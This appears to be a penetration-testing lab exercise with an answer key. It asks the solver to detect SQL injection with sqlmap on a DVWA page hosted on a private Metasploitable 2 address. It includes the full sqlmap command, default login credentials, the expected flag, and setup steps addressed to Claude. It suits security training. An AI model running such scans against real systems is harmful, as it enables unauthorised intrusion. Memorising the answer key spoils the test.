# Q251 — Detect SQL Injection Point Using SQLMap

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟢 Easy |
| **Tools** | `sqlmap` |
| **Time budget** | 5–10 min |

---

## 📝 Question

"Use sqlmap to test if the `id` parameter on `http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit` is vulnerable to SQL injection. Report the injection type found."

---

## 🎯 Flag Format

```
vulnerable=<yes|no>; injection_type=<type>
```

---

## 💡 Hints

**Hint 1**

`sqlmap -u "URL" --cookie="PHPSESSID=xxx;security=low"` — DVWA needs cookie.

**Hint 2**

`--batch` flag auto-answer prompts ke liye use karo.

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --batch
```

**Answer:** `vulnerable=yes; injection_type=UNION-based`

---

## 🤖 Claude Setup Prompt

1. Ensure DVWA running on Metasploitable2
2. Login to DVWA (admin:password), set security=low
3. Note PHPSESSID cookie

Report back: "Lab ready for Q251 — DVWA SQLi page accessible"
